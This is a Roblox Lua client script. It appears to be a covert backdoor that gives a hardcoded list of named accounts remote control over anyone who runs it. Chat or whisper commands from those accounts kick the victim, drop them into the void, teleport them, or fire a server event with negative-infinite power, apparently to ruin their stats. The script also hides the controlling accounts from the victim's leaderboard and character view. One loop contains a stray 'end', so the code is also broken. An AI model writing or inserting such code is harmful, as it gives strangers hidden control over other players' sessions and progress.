local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

local Admins = {
	["QT_xAraa"] = true,
	["Shot16kill"] = true,
	["theoverryou3_alt"] = true,
	["Raiden_Nika"] = true,
	["philippinesBraxy123"] = true,
	["Brxy_Alt"] = true,
	["VyxzarlIion"] = true,
	["Bowmbaclaat"] = true,
	["Drenvoryth"] = true
}

local function destroyCharacter(player)
	if player.Character then
		player.Character:Destroy()
	end
end

local function hideFromLeaderboard(player)
	RunService.RenderStepped:Connect(function()
		local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
		if playerGui then
			for _, gui in ipairs(playerGui:GetDescendants()) do
				if gui:IsA("TextLabel") or gui:IsA("TextButton") then
					if gui.Text == player.Name then
						gui.TextTransparency = 1
						gui.Visible = false
					end
				end
			end
		end
	end)
end

local function handleAdmin(player)
	destroyCharacter(player)
	hideFromLeaderboard(player)
	player.CharacterAdded:Connect(function()
		destroyCharacter(player)
	end)
end

local instakillStarted = false

local function ChatCommand(speakerName, message)
	if not Admins[speakerName] then return end
	message = message:lower()

	local kickTarget = message:match("//kick%s+(%w+)")
	if kickTarget and LocalPlayer.Name:lower():find(kickTarget) then
		LocalPlayer:Kick("You were removed from the game by an unknown authority.")
	end

	local voidTarget = message:match("//void%s+(%w+)")
	if voidTarget and LocalPlayer.Name:lower():find(voidTarget) then
		local char = LocalPlayer.Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			char:MoveTo(Vector3.new(0, -1000, 0))
		end
	end

	if message:find("//bringusers") then
		local admin = Players:FindFirstChild(speakerName)
		if admin and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
			local root = admin.Character.HumanoidRootPart
			local char = LocalPlayer.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				char:MoveTo(root.Position + Vector3.new(3, 0, 3))
			end
		end
	end

	if message:find("//shutdown") then
		TeleportService:Teleport(PlaceId, LocalPlayer)
	end

	local instakillTarget = message:match("//instakill%s+(%w+)")
	if instakillTarget and LocalPlayer.Name:lower():find(instakillTarget) and not instakillStarted then
		instakillStarted = true

		RunService.RenderStepped:Connect(function()
			-- Rename Train in Backpack
			for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
				if item:IsA("Tool") and item.Name == "Train" then
					item.Name = "None"
				end
			end

			-- Rename Train in Character
			local char = LocalPlayer.Character
			if char then
				for _, item in ipairs(char:GetChildren()) do
					if item:IsA("Tool") and item.Name == "Train" then
						item.Name = "None"
					end
				end
			end

			-- Rename Train in Workspace directly under LocalPlayer
			for _, item in ipairs(workspace:GetChildren()) do
				if item:IsA("Tool") and item.Name == "Train" and item.Parent == workspace then
						item.Name = "None"
					end
				end
			end
		end)

		-- Try to equip "None" tool
		local Backpack = LocalPlayer.Backpack
		local Character = LocalPlayer.Character
		local None = Backpack:FindFirstChild("None") or (Character and Character:FindFirstChild("None"))
		if None and None.Parent == Backpack then
			None.Parent = Character
		end

		game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -math.huge)
		game.ReplicatedStorage.RemoveEvent.SpawnCharacterEvent:FireServer("RandomSpawn")
	end
end

TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(messageData)
	local textSource = messageData.TextSource
	if textSource then
		local speaker = Players:GetPlayerByUserId(textSource.UserId)
		if speaker then
			ChatCommand(speaker.Name, messageData.Text)
		end
	end
end)

Players.LocalPlayer.Chatted:Connect(function(message)
	local target, msg = message:match("^/w%s+(%w+)%s+(.+)")
	if not target then
		target, msg = message:match("^/whisper%s+(%w+)%s+(.+)")
	end
	if target and msg and Admins[LocalPlayer.Name] and target:lower() == LocalPlayer.Name:lower() then
		ChatCommand(LocalPlayer.Name, msg)
	end
end)

ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
	if messageData.MessageType == "Whisper" then
		local speaker = Players:FindFirstChild(messageData.FromSpeaker)
		if speaker and messageData.ToSpeaker == LocalPlayer.Name then
			ChatCommand(speaker.Name, messageData.Message)
		end
	end
end)

for _, player in pairs(Players:GetPlayers()) do
	if player ~= LocalPlayer and Admins[player.Name] then
		handleAdmin(player)
	end
end

Players.PlayerAdded:Connect(function(player)
	if player ~= LocalPlayer and Admins[player.Name] then
		handleAdmin(player)
	end
end)
